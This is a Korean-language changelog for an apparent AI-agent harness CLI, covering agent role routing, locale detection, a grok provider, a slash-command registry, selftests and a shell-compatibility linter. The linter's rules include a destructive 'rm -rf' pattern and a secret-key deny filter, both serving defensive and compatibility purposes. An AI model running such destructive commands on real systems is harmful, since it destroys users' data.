**🎭 여러 AI 에이전트 활성 시 역할을 provider+model 에 매핑하고 `dispatch --role` 로 라우팅 — 사용자가 선택적으로 역할 룰 설정 (사용자 명시).**

### 배경 + 방향성 판단 (사용자 요청)
사용자 요청: Codex gpt-5.5=코딩, Claude Opus=지휘/검수, Gemini=디자인 등 **모델별 역할 부여**가 leerness 프로젝트의 성능/정확도를 올리는지 판단하고 올바른 방향으로 구현.

**판단**: 역할 특화는 다음 조건에서 품질·정확도를 **유의미하게 향상**시킨다 —
1. **모델 강점이 분명할 때** — 코드 특화 모델(코딩)·강추론 모델(설계/검수)·멀티모달(디자인)을 적재적소 배치.
2. **독립 검수 분리** — 구현자와 다른 강추론 모델이 검수하면 **자기승인 편향(self-approval bias)** 차단 → 버그 적발률↑ (기존 `_AGENT_ROLE_PROMPTS` planner/reviewer/actor 분리 원칙의 모델 레벨 확장).
3. **작업 분해 가능 + 조율 오버헤드 < 이득**일 때.
→ 따라서 **opt-in(기본 미설정) + `roles verify`(비활성 provider 배정 경고) + `roles suggest`(활성 에이전트 기반 자동 배치 + 근거 제시)** 로 오설정을 막고 안전하게 도입. 단일 에이전트만 활성이면 모든 역할이 그 에이전트로 수렴(무해).

### 구현
1. **`ROLE_CATALOG` 7종** — commander(지휘)/reviewer(검수)/coder(코딩)/architect(설계)/designer(디자인)/debugger(디버그)/dispatcher(분배). 각 역할: 선호 provider 우선순위 + 모델 등급(top/code/fast) + **근거(why)**.
2. **`.harness/agent-roles.json`** 사용자 설정 — `{ roles: { <role>: { provider, model, persona } } }`.
3. **`leerness roles <list|set|unset|catalog|suggest|verify>`** CLI — 한국어 별칭(코딩→coder, 검수자→reviewer 등) · `set` 시 모델 미지정이면 등급 기반 자동 선택(`_pickModel`) · `suggest [--apply]` 활성 에이전트 기반 최적 배치 + 근거 · `verify` 비활성 provider 배정 적발(exit 1).
4. **`agents dispatch --role <role>`** — 역할 → provider+model 라우팅, `_dispatchCommand` 가 provider 별 모델 플래그 주입(claude `--model`, codex `-m`, agy/grok `--model`). `--model` 직접 override 도 지원.
5. **grok 통합 보완** (1.9.268 후속) — `_PROVIDER_MODEL_CATALOG`/`_PROVIDER_CYCLE_ORDER`/`_dispatchCommand` 에 grok 추가.
6. **MCP `leerness_roles`** (외부 AI 가 역할 배치/조회) + selftest 22 → 24 + e2e 218 → 219.

### 검증
- **selftest 24/24 PASS** · **E2E 219/219 PASS** (회귀 0).
- 실측: `roles set 코딩 --provider codex --model gpt-5.5` → coder/codex/gpt-5.5 · `dispatch --role reviewer` → `claude --print --model claude-opus-4-7 "..."` 모델 주입 확인 · `verify` 비활성 provider 🔴 적발 · `suggest` 활성 기반 배치 + 근거.

## 1.9.269 — 2026-06-02 — UR-0022: init 시 OS 시스템 언어 감지 → 설치 가이드 자동 언어 선택

**🌐 `npx leerness init` 등 설치 시 OS 시스템 언어를 감지해 설치 가이드/생성 문서를 알맞은 언어로 표시 (사용자 명시 UR-0022).**

### 배경
기존 `detectLanguageValue(root, 'auto')`는 프로젝트 파일(README/guideline 등)의 **한글 포함 여부만** 판별했음. 그 결과 빈 디렉토리에서 신규 `npx leerness init` 시 콘텐츠가 없어 한국어 OS 에서도 항상 영어(en)로 폴백됐음. 사용자 요청은 OS locale 기반으로 설치 언어를 자동 결정하는 것.

### 구현
1. **`_detectSystemLang(env)` 순수 함수 신설** — OS locale 감지. 우선순위: POSIX 환경변수(`LC_ALL`>`LC_CTYPE`>`LANG`>`LANGUAGE`) > Node ICU `Intl.DateTimeFormat().resolvedOptions().locale`(Windows 등 LANG 미설정 시 OS 언어 회수) > `null`. `C`/`POSIX` 로케일은 스킵. env 주입 가능(테스트).
2. **`detectLanguageValue` auto 우선순위 개선** — ① 프로젝트 콘텐츠 한글 → ② **콘텐츠가 비어있을 때만**(신규/빈 디렉토리 init) OS 시스템 언어 → ③ en 폴백. **콘텐츠가 있는 영어 프로젝트는 en 유지**(기존 프로젝트 회귀 방지).
3. **비대화형 설치 투명성 안내** — `npx leerness init --yes`(auto) 시 `🌐 시스템 언어 감지: KO (→ KO)` 한 줄 노출. `--language` 명시 시 미발화.
4. **언어 선택 UI 설명 갱신** — `install.lang.auto.desc` 에 "시스템(OS) 언어 자동 판별" 반영.
5. **selftest 20 → 22** — `_detectSystemLang` POSIX 파싱(ko_KR/en_US) + LC_ALL 우선/LANGUAGE 폴백 2종.
6. **e2e +1 (217 → 218)** — 빈 디렉토리 init auto + `LANG=en_US`/`ko_KR` → `.harness/LANGUAGE` 가 각각 en/ko 로 결정되는지 통합 검증.

### 검증
- **selftest 22/22 PASS** · **E2E 218/218 PASS** (회귀 0).
- 기존 init e2e 는 모두 `--language ko` 명시 → auto 변경 영향 없음(회귀 0 확인).

## 1.9.268 — 2026-06-02 — grok 정식 EXTERNAL_AGENTS provider 승격 (1.9.266 후속 task)

**🤖 grok 을 슬래시 레지스트리 전용에서 정식 provider 로 승격 — provider cycle / setup-agents / dispatch / `--help` probe 가 grok 도 자동 처리.**

### 배경
1.9.265~267(UR-0021)에서 grok 은 `AGENT_SLASH_COMMANDS` 슬래시 레지스트리에만 포함됐을 뿐 `EXTERNAL_AGENTS` 정식 provider 는 아니었음(1.9.266 CHANGELOG 명시 후속 task). 그 결과 `slash-commands --refresh` probe 대상에서 제외되고, install 흐름 6선택지·provider cycle·setup-agents 에서도 빠졌음. 1.9.267 의 `--help` probe(3단계)가 완성되면서 grok 을 정식 편입할 자연스러운 시점.

### 구현
1. **`EXTERNAL_AGENTS` 에 grok 추가** — `{ id:'grok', bin:'grok', envFlag:'LEERNESS_ENABLE_GROK', versionArgs:['--version'], installCmd:'npm i -g @vibe-kit/grok-cli' }`. 빌트인 5종 → **6종** (claude/codex/agy/**grok**/copilot/ollama).
2. **자동 전파** — EXTERNAL_AGENTS 를 순회하는 모든 소비처가 grok 흡수: `_checkAgent`(ready 감지)·`provider list`(6 builtin)·`slash-commands --refresh`(probe 대상)·`setup-agents`·`agents dispatch`·`agents list/quota`.
3. **install 흐름 6선택지 확장** — 대화형 `_selectMany` + 비대화형 `1~6` 맵에 grok 추가(`all` 배열 포함). `4) grok (xAI)` 신설로 5→6 선택지.
4. **비시크릿 키 + config 템플릿** — `_LEERNESS_NONSECRET_KEYS` 및 `.harness/leerness-config.json` 템플릿에 `LEERNESS_ENABLE_GROK` 추가(AI 가시성 유지, 시크릿 아님).
5. **슬래시 레지스트리 note 갱신** — grok `asOf: 1.9.268` + "정식 provider 승격 — --refresh 자동 probe 가능".
6. **selftest 19 → 20** — grok EXTERNAL_AGENTS 편입(bin/envFlag/length===6) 검증.

### 검증
- **selftest 20/20 PASS** · **E2E 217/217 PASS** (회귀 0).
- `provider list` → 총 6개(빌트인 6), grok=builtin 확인.
- `slash-commands grok --refresh --dry-run` → 이전 "probe 대상 아님" → 이제 probe 시도(미설치 시 ENOENT graceful fallback) — 3단계 probe 통합 확인.

## 1.9.267 — 2026-06-02 — UR-0021 3단계: CLI `--help` probe 슬래시 레지스트리 자동 refresh

**🔄 UR-0021 백로그 완전 소진 — 설치된 CLI 의 `--help` 출력을 probe 해 슬래시 명령 레지스트리를 자동 갱신 (best-effort, offline-first).**

### 배경
1단계(1.9.265)는 큐레이션 빌트인 레지스트리 + 사용자 override, 2단계(1.9.266)는 dispatch/handoff 자동 주입을 구축. 3단계는 처음부터 예정됐던 "항상 최신화 3중 경로"의 마지막 — CLI `--help` probe 자동 refresh. 외부 CLI 의 슬래시 명령은 버전마다 변동하므로, 큐레이션(빌트인)·수동(override)에 더해 *설치된 실제 CLI 에서 직접 회수*하는 경로를 완성.

### 구현
1. **`_parseSlashFromHelp(text, invoke)` 순수 파서** — `--help` 출력에서 슬래시 명령(`/cmd  desc`) 또는 하위명령(들여쓰기 `cmd  desc`) best-effort 추출. ANSI 색상 제거 · CLI 플래그(`--foo`)·옵션 의도적 제외 · cmd 길이 24자 가드 · 중복 제거. 부작용 0 → selftest 가능.
2. **`_probeAgentSlash(extDef, opts)`** — EXTERNAL_AGENTS 항목의 `bin` 을 `--help` 로 spawn (타임아웃 5s, `windowsHide`). copilot 처럼 subcommand 인 경우 `versionArgs` 의 base(예: `['copilot']`) 재사용. 실패(ENOENT)/0건 검출 시 `ok:false` + 한국어 reason → **호출부가 큐레이션 빌트인 유지(파괴적 덮어쓰기 방지)**.
3. **`_refreshAgentSlashCommands(root, targets, opts)`** — probe 성공 agent 만 `.harness/agent-slash-commands.json` 으로 병합 기록(나머지 보존), `note: "probed via …"` + `asOf: VERSION`. grok/ollama 등 EXTERNAL_AGENTS 미포함은 큐레이션/override 만.
4. **`slash-commands [agent] --refresh [--dry-run]` CLI** — 전체/단일 agent probe. dry-run 기본 미적용(실 기록은 `--refresh` 단독). `--json` 기계 판독.
5. **MCP `leerness_slash_commands` 확장** — `refresh`/`dryRun` 인자 추가(외부 AI 가 sub-agent 호출 전 레지스트리 자동 갱신).
6. **selftest 17 → 19** — `_parseSlashFromHelp` 슬래시 검출+플래그 제외 · subcommand 들여쓰기 파싱 2종 추가.

### 검증
- **selftest 19/19 PASS** · **E2E 217/217 PASS** (회귀 0).
- probe 성공 경로 단위 검증: 가짜 CLI(`--help` 슬래시 출력) → 2건 검출, `--version` 플래그 정상 제외.
- graceful fallback 검증: claude/codex/agy 미설치(ENOENT) + grok(대상 외) + copilot(gh ext 미설치, 0건) → 큐레이션 유지, 파일 미기록.

### UR-0021 완료
1단계(레지스트리/CLI/hint) → 2단계(dispatch/handoff 주입/MCP 73) → **3단계(--help probe 자동 refresh)** 로 "항상 최신화 3중 경로" 완성.

## 1.9.266 — 2026-06-01 — UR-0021 2단계: dispatch 슬래시 명령 자동 주입 + handoff 노출 + MCP 73

**🤖 서브에이전트 dispatch/handoff 에 각 에이전트 슬래시 명령을 자동 노출 — "알맞은 슬래시 명령으로 작업" (사용자 명시 UR-0021 2단계).**

### 배경
1단계(1.9.265)에서 레지스트리·CLI·`_agentSlashHint` 헬퍼를 구축. 2단계는 사용자 요구 핵심 — "서브에이전트 호출 시 각 에이전트에 알맞는 슬래시 명령이 적절히 사용" — 을 실제 dispatch 경로 + 세션 시작(handoff)에 연결.

### 구현
1. **`agents dispatch <task> --to <id>` 슬래시 힌트 주입** — 실행 명령 아래에 대상 에이전트 슬래시 명령 노출 (subcommand 타입은 "하위명령" 라벨).
2. **`agents multi` 슬래시 힌트** — 각 에이전트 명령마다 `🤖 슬래시: ...` 한 줄 + `--json` 에 `slashCommands` 필드 (`{ <id>: { invoke, commands[] } }`).
3. **handoff 본문 활성 에이전트 슬래시 섹션** — env flag(`LEERNESS_ENABLE_*`) 활성 에이전트별 슬래시 명령 요약. **spawn 없이 env 점검만** (handoff 속도 보존, 오버헤드 측정값 ~0). 활성 0이면 미노출.
4. **MCP 73번째 도구 `leerness_slash_commands`** — 외부 AI(메인)가 sub-agent 호출 전 각 에이전트 슬래시 명령 회수. 인자 `{ path?, agent? }`.
5. **grok 범위 메모**: grok 은 슬래시 레지스트리에 포함(CLI/MCP/hint 조회 가능)되나, 아직 `EXTERNAL_AGENTS` 정식 provider 는 아님 → dispatch/handoff 활성 목록은 claude/codex/agy/copilot/ollama 기준. grok 정식 provider 승격(install 흐름 1~5 선택지 확장 포함)은 별도 후속 task.

### stress-v211 — **21/21 PASS · 100%**
- 1.9.266 (8): MCP 73·handoff 노출/비노출·MCP round-trip(grok/전체)·dispatch·multi·json 주입 경로·hint
- 성능 (2): cold start + handoff 활성 섹션 오버헤드 측정(WITH−WITHOUT delta, ~0)
- 누적 회귀 (11): 1.9.207~265 (slash-commands CLI·레지스트리·record·shellGuard JSON·handoff 12필드·selftest 17·require.main·agy/gemini·ps5-chain·_isSecretKey·CJK)

## 1.9.265 — 2026-06-01 — UR-0021 1단계: CLI 에이전트 슬래시 명령어 레지스트리 (claude/codex/agy/grok/copilot)

**🤖 각 CLI AI 에이전트의 슬래시 명령어를 큐레이션·기록하고, 서브에이전트 호출 시 알맞게 참조 (사용자 명시 UR-0021 1단계).**

### 배경
codex/agy/claude/grok 등 CLI 로 구동되는 AI 에이전트는 각자 다른 슬래시 명령(`/init`, `/compact`, `/diff` …)을 쓴다. 서브에이전트로 dispatch 할 때 각 에이전트에 맞는 슬래시 명령을 알맞게 써야 작업이 제대로 된다. 이를 위해 명령어를 항상 최신화·기록하는 레지스트리가 필요. (review-request: ✓ 진행 안전 / reuse: 기존 레지스트리 없음 — 신규)

### 구현 (1단계 — 레지스트리 + CLI + dispatch 헬퍼)
1. **`AGENT_SLASH_COMMANDS` 빌트인 레지스트리** — claude(13)/codex(10)/agy(6)/**grok(6)**/copilot(3). 각 명령 `{cmd, desc}` + `asOf` 버전 + `invoke`(slash|subcommand) + `note`.
   - **Grok CLI** 사용자 명시 반영 (`/help /clear /model /new /login /exit`)
   - copilot 은 슬래시가 아닌 `gh copilot <sub>` 하위명령 → `invoke: 'subcommand'` 라벨
2. **항상 최신화 3중 경로**: (1) 빌트인은 릴리스마다 갱신(`asOf`), (2) 사용자 `.harness/agent-slash-commands.json` override 병합(기존 agent 명령 교체 + 신규 agent 추가), (3) [2~3단계 예정] CLI `--help` probe 자동 refresh.
3. **`leerness slash-commands [agent]` CLI**: 전체/단일 목록 · `--json` · `--record`(워크스페이스 기록) · `--detect`(설치된 CLI 표시) · 별칭 `slash`/`agent-slash`.
4. **`_agentSlashHint(root, agentId)` 헬퍼 export** — 서브에이전트 dispatch 시 주입할 1줄 요약 + 명령 배열 (2단계에서 agents multi/agent 가 활용).
5. **selftest 2종 추가** (15→17): 레지스트리 5종 보유 + hint 요약/하위명령 라벨.

### 2~3단계 예정
- 2단계: `agents multi`/`agent` dispatch 시 대상 에이전트 슬래시 명령 자동 주입 + handoff 노출
- 3단계: 설치된 CLI 의 `--help`/`/help` 를 probe 해 레지스트리 자동 refresh

### stress-v210 — **26/26 PASS · 100%**
- 1.9.265 (13): 레지스트리 5종·grok·load/merge(builtin/user/신규)·record·hint·copilot subcommand·CLI list/json/record/unknown
- 성능 (2): cold start avg 370ms · load 100회 4ms
- 누적 회귀 (11): 1.9.207~264 (selftest 17·shellGuard JSON·handoff 12필드·MCP 72·shell-guard·require.main·agy/gemini·CJK·_isSecretKey·path-setup)

## 1.9.264 — 2026-06-01 — shellGuard JSON 12번째 통합 필드 (handoff/session close/health) + session close 본문 셸 요약

**🐚 UR-0020 셸 실패 메모리를 `--json` 표면 3 명령에 일관되게 통합 — 외부 AI/자동화가 셸 호환성 상태를 구조적으로 소비.**

### 배경
1.9.263에서 셸 실패 메모리를 handoff *본문 텍스트*에 노출했으나, `--json` 표면에는 없어 외부 AI/CI 가 구조적으로 못 읽음. leerness JSON 표면은 handoff/session close/health 3 명령이 동일 필드를 carry 하는 일관성 패턴(1.9.227/230/234 등)이 확립돼 있음 — `shellGuard` 를 12번째 필드로 추가해 그 패턴을 완성.

### 구현
1. **`shellGuard` JSON 12번째 통합 필드** — handoff/session close/health 3 명령 모두 동일 스키마:
   - `failureCount` · `recent`(최근 3건: cmd 50자/exitCode/shell/rules) · `envDriftChanges` · `envDrift`(node/PS 버전 변동 배열 또는 null)
2. **session close 본문 셸 요약** (1.9.217 통합 보고에 추가): 실패 누적 시 "🐚 셸 실패 누적 N건 — 다음 handoff 가 자동 노출" + env drift 경고, 깨끗하면 "✓ 셸 실패 기록 없음". `_loadShellFailures`/`_shellEnvDrift` 재사용 (1.9.263 export).

### stress-v209 — **22/22 PASS · 100%**
- 1.9.264 (9): shellGuard 스키마·실패 반영·3 명령 일관성·envDrift 반영·session close 본문 노출/비노출
- 성능 (2): cold start avg 403ms · handoff --json 1540ms
- 누적 회귀 (11): 1.9.207~263 (handoff 본문 셸 가드·JSON 12 필드·MCP 72·shell-guard·selftest 15·require.main·path-setup·CJK·_isSecretKey·posixEncoding)

## 1.9.263 — 2026-06-01 — UR-0020 3단계: handoff 셸 실패 메모리 + 환경 버전 변동 자동 노출

**🐚 과거 터미널 셸 실패 기록 + 환경 버전 변동을 매 세션 handoff 본문에 자동 표면화 (사용자 명시 UR-0020 완성).**

### 배경
UR-0020 1·2단계에서 shell-guard 린터(6 규칙)·실패 메모리(`.harness/shell-failures.json`)·MCP 도구(72번째)를 구축했으나, 기록된 실패가 handoff 본문에 자동 노출되지 않아 새 세션 AI 가 "과거에 `&&` 가 실패했다"는 맥락을 능동적으로 못 봄. 사용자 요청 핵심("다음 터미널 실행 시 과거 실패를 고려")을 완성하려면 handoff 자동 표면화가 필요.

### 구현
1. **handoff 본문 셸 가드 섹션** (`## 🐚 터미널 셸 가드`): 기록된 셸 실패가 있거나 환경 버전이 변동되면 자동 노출
   - `_loadShellFailures(root)` — 최근 3건 표시 (명령 50자 + exit code + shell + 감지 규칙)
   - `_shellEnvDrift(root)` — `environment.json` 스냅샷 ↔ 현재 비교 (node·PowerShell 버전 변동 시 "과거 실패 재검토 권장" 경고)
   - 실패·변동이 모두 없으면 섹션 미노출 (false-positive 차단)
2. **exports 확대**: `_shellFailuresPath`·`_loadShellFailures`·`_recordShellFailure`·`_shellEnvDrift` 4종 → 단위 테스트 가능 (require.main 가드로 init 미실행)

### stress-v208 — **25/25 PASS · 100%**
- 1.9.263 (12): exports 4종·경로·빈 워크스페이스·기록·200 cap·env drift null/변동 감지·CLI record 영속·handoff 노출/비노출/drift 경고
- 성능 (2): cold start avg 391ms · 200건 write 104ms
- 누적 회귀 (11): 1.9.207~262 (MCP 72·shell-guard·selftest 15·require.main 가드·path-setup·handoff JSON 11·posixEncoding·CJK·_isSecretKey·shell-guard summary)

## 1.9.262 — 2026-05-31 — CLAUDE/AGENTS 문서 누적 갱신 (1.9.253~261 drift 차단)

**📚 메타 지침서가 1.9.252 에 멈춰 있어 9 라운드(1.9.253~261) 미반영 → 누적 갱신.**

### 배경
CLAUDE.md / AGENTS.md (AI 핸드오프 핵심 지침)가 마지막으로 1.9.252까지만 반영. UR-0019(PATH 자동 등록)·UR-0020(shell-guard)·selftest·require.main 가드·테스트 인프라가 문서에 없어, 새 세션 AI 가 최신 기능을 인지 못 할 drift 위험. (기존 1.9.171/214/238/253 doc-sync 라운드 계승)

### 구현 (문서 전용 — 코드 변경 없음, VERSION bump만)
1. **CLAUDE.md**: "UR-0019~0020 + 테스트 인프라 (1.9.253~261)" 섹션 추가
   - UR-0019 path-setup + require.main 가드 · 단위 테스트 인프라 · selftest(CLI/MCP/npm test) · UR-0020 shell-guard(6 규칙)
   - 마일스톤 1.9.252 → 1.9.261 (R217 · 123 main-push · 84 npm · MCP 72 · CLI 59 · UR-0013~0020 소진)
2. **AGENTS.md**: UR-0019~0020 테이블 + shell-guard 6 규칙 + require.main 가드 설명 + 마일스톤 1.9.261

### stress-v207 — **20/20 PASS · 100%**
- 1.9.262 (9): CLAUDE/AGENTS 섹션·path-setup·shell-guard·selftest·마일스톤·UR-0013~0020 소진·stale 해소
- 성능 (1): cold start avg 410ms
- 누적 회귀 (10): 1.9.207~261

### 자동 release (124 main-push streak · 85 npm publish streak · R218)

📚 **AI 핸드오프 지침 최신화** — 새 세션 에이전트가 UR-0019~0020·selftest·shell-guard 를 즉시 인지, drift 0.

---

## 1.9.261 — 2026-05-31 — UR-0020 2단계: MCP leerness_shell_guard (72 도구) + selftest 케이스

**🐚🔌 1.9.260 shell-guard 를 외부 AI(MCP) + 무결성 검증(selftest)에 통합.**

### 구현
1. **MCP 72번째 도구 `leerness_shell_guard`** (71 → 72):
   - 외부 AI(Claude Code 등)가 명령 실행 **전에** `tools/call` 로 셸 호환성 점검
   - 예: `npm run build && npm test` on PowerShell 5.1 → ps5-chain error + `;` 제안
   - 응답: `{ shell, psVersion, issues[], pastSame, pastSimilar, ok }` · 인자 `{ command (required), path? }`
   - 실 stdio JSON-RPC 검증: tools/list 72 + tools/call shell_guard 응답 OK
2. **selftest 케이스 +2** (13 → 15):
   - `_shellGuardAnalyze`: PS5.1 `&&` → ps5-chain error · bash `&&` → 문제 없음
   - 코어 무결성 검증에 셸 린터 포함 (CLI + MCP + npm test 게이트 모두 자동 검증)

### stress-v206 — **18/18 PASS · 100%**
- 1.9.261 (7): VERSION + MCP 72 정의/핸들러 + 실 서버 list/call + selftest 15 케이스
- 성능 (1): cold start avg 440ms
- 누적 회귀 (10): 1.9.207~260 + MCP initialize 프로토콜

### 자동 release (123 main-push streak · 84 npm publish streak · R217)

🐚🔌 **shell-guard 3중 노출** — CLI(1.9.260) + MCP 도구(1.9.261) + selftest 케이스. 외부 AI 가 명령 실행 전 셸 실패를 사전 차단.

---

## 1.9.260 — 2026-05-31 — 🎉 1.9.260 / UR-0020 shell-guard (터미널 셸 호환성 린터 + 실패 메모리)

**🐚 사용자 명시 (UR-0020): 터미널 명령 실패를 파악·기록하고 다음 실행 시 셸 호환성(PowerShell 5.1 && 미지원 등)을 참조.**

### 개발 방향 분석 (사용자 요청 "알맞는 방향 고민")
leerness 는 0-dependency Node CLI 라 셸을 직접 가로챌 수 없음 → 가장 안전·유용한 방향은 **(1) 실행 전 정적 린터 + (2) 실패 메모리 + (3) 환경 버전 변동 감지**. 기존 인프라(`_collectRuntimeEnv` 1.9.241 PS 버전 감지 + `environment.json` 1.9.145 스냅샷) 재사용.

### 구현 (`leerness shell-guard "<command>"`)
1. **정적 셸 호환성 린터** `_shellGuardAnalyze(cmd, ctx)` (순수 함수, 6 규칙):
   - **ps5-chain** (error): Windows PowerShell 5.1 `&&`/`||` 미지원 → `A; if ($?) { B }` 제안 (핵심 시나리오)
   - **ps-devnull** (error): `2>/dev/null` → `2>$null`
   - **ps-inline-env** (error): `VAR=x cmd` → `$env:VAR='x'; cmd`
   - **ps-rm-rf** (warn): `rm -rf` → `Remove-Item -Recurse -Force`
   - **cmd-semicolon** (warn): CMD `;` 구분자 아님 → `&` / `&&`
   - **ps-version-unknown** (info): PS 버전 미상 + `&&` → 안전 패턴 권장
2. **실패 메모리** `.harness/shell-failures.json` (200건 cap):
   - `shell-guard --record --cmd "..." --exit N` 기록 → 다음 분석 시 동일/유사(첫 토큰) 실패 회수
3. **환경 버전 변동 감지**: `environment.json` 스냅샷 vs 현재 node/PowerShell 버전 비교 → 변동 시 경고
4. PS 버전·셸 자동 판별 (`_detectShellCtx`) + `--json` (error 시 exit 1) + 순수 함수 export (단위 테스트)

### 다음 라운드 참조 (UR-0020 후속 후보)
- handoff/agent-mode 에 shell-failures 요약 자동 노출 · MCP leerness_shell_guard 도구 · selftest 케이스 추가

### stress-v205 — **27/27 PASS · 100%**
- 1.9.260 (16): 6 규칙 분석 + record/advise 회수 + 200 cap + CLI/json/help
- 성능 (1): cold start avg 441ms
- 누적 회귀 (10): 1.9.207~259

### 자동 release (122 main-push streak · 83 npm publish streak · R216)

🐚 **셸 실패 예방** — Windows PowerShell 5.1 `&&` 등 셸 차이로 인한 터미널 실패를 실행 전 감지 + 과거 실패 회수.

---

## 1.9.259 — 2026-05-30 — MCP leerness_selftest (71 도구) + npm test 무결성 게이트

**🔌 1.9.258 selftest 를 워크플로에 통합: 외부 AI(MCP) + 배포 파이프라인(npm test) 양쪽에서 무결성 검증.**

### 구현
1. **MCP 71번째 도구 `leerness_selftest`** (70 → 71):
   - 외부 AI(Claude Code 등)가 `tools/call` 로 leerness 무결성 확인 → `{ version, total, pass, fail, ok, results[] }`
   - tools/list 71 도구 노출 + 핸들러 → `selftest --json`
   - 실제 stdio JSON-RPC 라운드트립 검증: tools/list 71 + tools/call ok=true 13/13
2. **npm test 무결성 게이트**:
   - `test`: `--version && selftest && e2e` — selftest 가 e2e 보다 먼저 (fast-fail)
   - 배포/CI 시 코어 함수 손상을 e2e 전에 즉시 감지 (release sync-main 자동 publish 안전망)

### stress-v204 — **18/18 PASS · 100%**
- 1.9.259 (7): VERSION + MCP 71 정의/핸들러 + 실 서버 list/call + npm test 게이트 순서
- 성능 (1): cold start avg 371ms
- 누적 회귀 (10): 1.9.207~258 + MCP initialize 프로토콜 회귀

### 자동 release (121 main-push streak · 82 npm publish streak · R215)

🔌 **selftest 3중 노출 완성** — CLI(1.9.258) + MCP 도구 + npm test 게이트. 외부 AI·CI·배포 모두 무결성 자동 검증.

---

## 1.9.258 — 2026-05-30 — leerness selftest 명령 (코어 함수 무결성 자가 검증)

**🩺 사용자/CI 가 설치된 leerness 바이너리의 건강 상태를 1초 내 검증하는 신규 명령.**

### 배경
`npx` 캐시 손상, 부분 설치, 버전 충돌 등으로 leerness 가 비정상 동작할 수 있음. 1.9.255~257에서 export 한 보안/정확성/인코딩-핵심 순수 함수를 실제 호출해 무결성을 자가 검증.

### 구현 (`leerness selftest [--json]`)
1. **`_selfTestCases()`** — 13개 코어 함수 무결성 케이스 (순수 함수만, 파일/네트워크 부작용 0):
   - `_isSecretKey` (시크릿 차단 3종) · `compareVer` (대소/null 2종) · `parseHarnessVersion`
   - `_classifyCJK` (한/중/일) · `_riskLabel` (CP949/CP936) · `_dirInPath` · `_winPathPsScript` · `_unixPathBlock` · VERSION 형식
2. **`selfTestCmd`** — 사람용 ✓/✗ 리스트 + `--json` (기계 판독)
   - 전체 통과 → exit 0 / 1건이라도 실패 → **exit 1** (CI 친화) + 재설치 안내
3. **`self-test` 별칭** + help 노출 + `selfTestCmd`/`_selfTestCases` export

### stress-v203 — **21/21 PASS · 100%**
- 1.9.258 (10): export + 13 케이스 무결성 + CLI exit 0/json/별칭 + 실패시 감지 + help + 성능(<1.5s)
- 성능 (1): cold start avg 400ms
- 누적 회귀 (10): 1.9.207~257

### 자동 release (120 main-push streak · 81 npm publish streak · R214)

🩺 **설치 건강 진단** — `leerness selftest` 로 사용자/CI 가 바이너리 무결성을 즉시 확인 (손상 시 exit 1 + 재설치 안내).

---

## 1.9.257 — 2026-05-30 — CJK 분류 함수 추출+단위테스트 + release 브랜치 정리 (🎉 80 npm streak)

**🧪 1.9.255/256 테스트 인프라 연장 + 🧹 누적 release 브랜치 정리 (handoff 장기 경고 해소).**

### 구현
1. **CJK 분류 순수 함수 모듈 스코프 추출** (테스트 가능성):
   - `_classifyCJK(buf, len)` / `_riskLabel(cjk)` — `_scanShellScriptsEncoding` 내부 중첩 → 모듈 스코프로 추출 + export
   - UTF-8 lead byte 기반 Korean(EA-ED)/Japanese(E3)/Chinese(E4-E9) 분류 → CP949/CP932/CP936 위험 판정 (UR-0014 계열)
   - 실 동작 단위 테스트: 한국어/일본어/중국어/ASCII 버퍼 분류 + 동률 시 korean 우선 + len 범위 제한 + risk label 4종
   - env encoding 명령 동작 보존 (추출 부작용 0 — e2e + A3 검증)
2. **release 브랜치 누적 정리** (🧹 maintenance):
   - 로컬 release/* 브랜치 **213 → 20** (`release cleanup --apply --keep 12`)
   - handoff 가 수십 라운드 경고하던 "50+ branches 누적" 해소. 태그 + 원격이 히스토리 보존 → 로컬 정리 안전.

### stress-v202 — **24/24 PASS · 100%**
- 1.9.257 (13): export + _classifyCJK (5) + _riskLabel (5) + env encoding 보존
- 성능 (1): cold start avg 385ms
- 누적 회귀 (10): 1.9.207~256 — 실 함수 호출 검증 (_isSecretKey/PATH/posix 등)

### 자동 release (119 main-push streak · 🎉 80 npm publish streak · R213)

🎉 **80 npm publish streak** — 테스트 인프라 3 라운드 누적(1.9.255 require.main + 1.9.256 보안/버전 + 1.9.257 CJK) + 누적 브랜치 정리.

---

## 1.9.256 — 2026-05-29 — 단위 테스트 인프라 확대 (보안/정확성-핵심 순수 함수)

**🧪 1.9.255 require.main 가드 기반 확장: 소스 regex 가 아닌 실제 함수 동작을 검증하는 단위 테스트로 회귀 강화.**

### 배경
기존 stress 테스트는 대부분 `/regex/.test(src)` (소스 문자열 존재 확인) — 약한 회귀. 1.9.255의 `require.main` 가드로 내부 함수를 직접 import 가능해졌으므로, 보안/정확성-핵심 순수 함수의 **실 동작**을 검증.

### 구현 (export 3종 추가 — 코드 동작 변경 없음, 테스트 표면만 확장)
1. **`_isSecretKey`** (보안-핵심): config inject 시 시크릿 키 차단. 실 동작 검증:
   - TOKEN/SECRET/PASSWORD/API_KEY/PRIVATE 차단 (대소문자 무관, 부분 매칭)
   - 비시크릿 LEERNESS_* 통과
2. **`compareVer`** (정확성-핵심): stale-check/업데이트 감지의 버전 비교. 실 동작 검증:
   - major/minor/patch 대소 + 누락 파트 0 처리 + null/빈 문자열 안전
3. **`parseHarnessVersion`**: canonical/legacy-plus/legacy/빈 입력 파싱

### stress-v201 — **24/24 PASS · 100%**
- 1.9.256 (12): export + _isSecretKey (3) + compareVer (4) + parseHarnessVersion (4)
- 성능 (1): cold start avg 346ms
- 누적 회귀 (11): 1.9.207~255 — 특히 보안 회귀를 소스 regex → **실 함수 호출**로 전환 (강한 회귀)

### 자동 release (118 main-push streak · 79 npm publish streak · R212)

🧪 **회귀 신뢰도 강화** — 보안(_isSecretKey)·버전 비교(compareVer) 등 핵심 로직을 실 동작으로 검증, 소스 문자열 의존 약점 보완.

---

## 1.9.255 — 2026-05-29 — UR-0019 2단계: PATH 등록 실제 테스트/디버그 + require.main 가드

**🧪 사용자 명시 (UR-0019 후속 "테스트 및 디버그 다음라운드 참고"): PATH 자동 등록 실제 동작 검증 + 테스트 인프라.**

### 배경
1.9.254에서 `path-setup` 구현 후, 실제 `--apply` 등록 로직(Unix shell-rc append, Windows PS-script)의 깊은 테스트/디버그가 필요. 단, 실 PATH 변경은 위험 → 단위 테스트 가능하도록 리팩터링.

### 구현 (테스트 가능성 + 안전 검증)
1. **`require.main === module` 가드** (footgun fix):
   - `node harness.js` / `npx leerness` CLI 직접 실행 시에만 `main()` 호출
   - `require('harness.js')` 시 init 부작용 없이 내부 함수 import 가능 → 단위 테스트 활성화
   - 기존 CLI 동작 100% 보존 (e2e 217 검증)
2. **순수 함수 추출** (테스트/디버그 가능):
